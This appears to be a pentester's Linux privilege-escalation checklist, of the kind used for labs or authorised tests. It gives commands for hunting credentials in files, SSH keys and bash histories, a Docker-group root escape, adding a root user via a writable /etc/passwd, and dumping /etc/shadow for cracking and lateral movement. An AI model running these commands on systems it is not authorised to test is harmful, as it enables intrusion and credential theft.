# Linux Privilege Escalation Checklist

**DO NOT SKIP STEPS.** Check every box in order. This prevents missing obvious vectors.

## Initial Enumeration (Always Run First)

- [ ] [[Linux Privilege Escalation#LinPEAS (Kali Source)|LinPEAS (Kali Source)]]
- [ ] Run basic context: `id`, `whoami`, `hostname`, `uname -a`
- [ ] Check sudo rights: `sudo -l`
- [ ] Check SUID binaries: `find / -perm -u=s -type f 2>/dev/null`
- [ ] List cronjobs: `cat /etc/crontab` and `ls -la /etc/cron.*`
- [ ] Check writable paths: `find / -writable -type d 2>/dev/null | grep -v proc`

## Credential Hunting (Even If You Already Have Access)

**DO NOT ASSUME you found all credentials. Always check:**

- [ ] Search home directories: `find /home -type f -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null`
- [ ] Check bash history: `cat ~/.bash_history` and `cat /home/*/.bash_history 2>/dev/null`
- [ ] Search for passwords in files: `grep -r "password" /home /var/www /opt 2>/dev/null | grep -v Binary`
- [ ] Check for SSH keys: `find / -name id_rsa -o -name id_dsa -o -name id_ecdsa 2>/dev/null`
- [ ] Database config files: `find / -name "*config*.php" -o -name "*config*.py" 2>/dev/null`
- [ ] Check `/opt`, `/var/backups`, `/tmp`: `ls -laR /opt /var/backups /tmp 2>/dev/null`

## Quick Win Checks (High Priority)

- [ ] GTFOBins sudo: If `sudo -l` shows anything, check https://gtfobins.github.io/
- [ ] Writable /etc/passwd: `ls -la /etc/passwd` (if writable, add root user)
- [ ] Docker group: If `id` shows docker group, exploit with `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
- [ ] LXD/LXC group: If in lxd group, exploit container escape
- [ ] Kernel exploits: Check `uname -r` against known exploits (last resort - can crash system)

## Service/Application Enumeration

- [ ] List running processes: `ps auxww` (look for root processes with writable binaries)
- [ ] Check listening ports: `ss -tulnp` or `netstat -tulnp` (internal services to enumerate)
- [ ] Check for MySQL/databases running: Test default creds `mysql -u root -p` (try empty password)
- [ ] Web servers running? Check `/var/www`, `/var/www/html` for config files with DB creds

## SUID/Capabilities Exploitation

- [ ] Review SUID binary list for GTFOBins entries
- [ ] Check capabilities: `getcap -r / 2>/dev/null` (python, perl, tar with cap_setuid can privesc)
- [ ] Test writable paths in SUID binary execution (PATH hijacking)

## Cronjob/Scheduled Task Abuse

- [ ] Check if any cronjob scripts are writable: `ls -la /etc/cron.*/`
- [ ] Monitor for cronjobs: `pspy64` (if available) or watch `/var/log/syslog`
- [ ] Check systemd timers: `systemctl list-timers --all`

## NFS/Network Share Checks

- [ ] Check NFS exports: `cat /etc/exports` (no_root_squash = win)
- [ ] Check mounted shares: `mount` and `cat /etc/fstab`

## Post-Root Enumeration (After Getting Root)

**EVEN WITH ROOT, check for useful items for lateral movement:**

- [ ] Dump /etc/shadow: `cat /etc/shadow` (crack for passwords to try elsewhere)
- [ ] Check SSH keys in /root and /home/*: `find /root /home -name id_rsa 2>/dev/null`
- [ ] Search for additional credentials: `grep -r "password" /root /home 2>/dev/null`
- [ ] Check network connections: `ip addr` (additional NICs for pivoting?)
- [ ] Review bash histories for all users: `cat /home/*/.bash_history /root/.bash_history 2>/dev/null`

## Common Pitfalls

**STOP and re-check if stuck for 15+ minutes:**
- Did you run LinPEAS and actually READ the output thoroughly?
- Did you check sudo -l and search GTFOBins?
- Did you search ALL home directories for credentials?
- Did you test found credentials against MySQL/databases?
- Did you check /opt, /var/backups for backup files?

## Reference

For detailed commands, see [[Linux Privilege Escalation]]
